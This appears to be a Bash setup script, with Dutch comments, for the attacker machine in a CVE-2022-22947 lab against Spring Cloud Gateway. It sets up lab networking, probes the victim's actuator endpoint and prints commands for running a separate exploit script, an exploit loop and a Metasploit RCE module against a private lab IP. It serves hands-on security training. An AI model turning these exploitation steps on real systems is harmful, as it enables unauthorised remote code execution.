#!/bin/bash
# ============================================================
# CVE-2022-22947 Lab - Attacker (Kali) Setup
# Uitvoeren op: Kali Linux 2022.2
# Installeert: Python3 requests, stelt IP in, test verbinding
# ============================================================

set -e

GREEN='\033[0;32m'
YELLOW='\033[1;33m'
RED='\033[0;31m'
BLUE='\033[0;34m'
NC='\033[0m'

log()  { echo -e "${GREEN}[+]${NC} $1"; }
warn() { echo -e "${YELLOW}[!]${NC} $1"; }
err()  { echo -e "${RED}[-]${NC} $1"; exit 1; }
info() { echo -e "${BLUE}[*]${NC} $1"; }

echo ""
echo "============================================"
echo " CVE-2022-22947 - Kali Attacker Setup"
echo "============================================"
echo ""

# --- Python requests installeren ---
log "Python3 requests installeren..."
sudo apt-get update -qq
sudo apt-get install -y python3-requests curl net-tools 2>/dev/null || \
    pip3 install requests

# --- Netwerk configureren ---
log "Intern netwerk configureren (eth1 -> 192.168.56.20)..."

# Tweede interface vinden (VirtualBox internal network)
IFACE=$(ip link | grep -E "^[0-9]+: e" | awk -F': ' '{print $2}' | grep -v "^eth0$\|^ens33$\|^enp0s3$" | head -1)
if [ -z "$IFACE" ]; then
    IFACE=$(ip link | grep -E "^[0-9]+: e" | awk -F': ' '{print $2}' | tail -1)
fi

info "Interface voor intern netwerk: $IFACE"
sudo ip addr add 192.168.56.20/24 dev $IFACE 2>/dev/null || warn "IP al ingesteld of fout"
sudo ip link set $IFACE up

# --- Verbinding testen ---
VICTIM_IP="192.168.56.10"
info "Verbinding testen met victim ($VICTIM_IP)..."

sleep 2
if ping -c 2 $VICTIM_IP &>/dev/null; then
    log "Victim bereikbaar via ping"
else
    warn "Ping mislukt. Controleer of victim VM draait en IP correct is."
fi

HTTP=$(curl -s -o /dev/null -w "%{http_code}" "http://$VICTIM_IP:8080/actuator/gateway/routes" 2>/dev/null)
if [ "$HTTP" = "200" ]; then
    log "Spring Gateway actuator bereikbaar -> TARGET KWETSBAAR!"
else
    warn "Actuator niet bereikbaar (HTTP $HTTP)"
    warn "Zorg dat de victim server draait (02_setup_server.sh uitgevoerd?)"
fi

echo ""
echo "============================================"
echo " Kali setup klaar! Exploit gebruiken:"
echo "============================================"
echo ""
echo "  Enkelvoudige exploit:"
echo "  cd $LAB_DIR"
echo "  python3 03_exploit.py --target http://$VICTIM_IP:8080 --cmd 'id'"
echo ""
echo "  Herhaalde exploit loop:"
echo "  bash 04_exploit_loop.sh http://$VICTIM_IP:8080"
echo ""
echo "  Metasploit module (optioneel):"
echo "  msfconsole -q -x \\"
echo "    'use exploit/multi/http/spring_cloud_gateway_rce;"
echo "     set RHOSTS $VICTIM_IP;"
echo "     set RPORT 8080;"
echo "     run'"
echo ""
